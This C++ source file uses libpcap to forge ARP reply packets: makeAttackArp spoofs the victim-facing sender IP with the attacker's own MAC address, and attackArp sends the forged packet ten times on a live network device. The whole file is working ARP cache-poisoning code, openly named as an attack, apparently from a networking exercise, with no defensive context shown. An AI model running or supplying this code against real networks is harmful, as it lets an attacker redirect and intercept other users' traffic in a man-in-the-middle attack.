#include "packet_func.h"

void makeAttackArp(u_char* mMac,u_char* senMac,uint8_t* tarIp,uint8_t* senIp,struct eth_header* eth,struct arp_header* arp){
    memcpy(eth->dstMac,senMac,6);
    memcpy(eth->srcMac,mMac,6);
    arp->opCode[0] = {0x00};
    arp->opCode[1] = {0x02};
    memcpy(arp->sMac,mMac,6);
    memcpy(arp->sIp,tarIp,4);
    memcpy(arp->dMac,senMac,6);
    memcpy(arp->dIp,senIp,4);
}
void attackArp(struct eth_header* eth, struct arp_header* arp,char* dev){
    int cnt=0;
    u_char packet[42];
    memcpy(packet,eth,14);
    memcpy(packet+14,arp,28);

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t *handle = pcap_open_live(dev
                , BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return ;
    }

    while(cnt!=10){
        pcap_sendpacket(handle,packet,42);
        cnt++;
    }
}
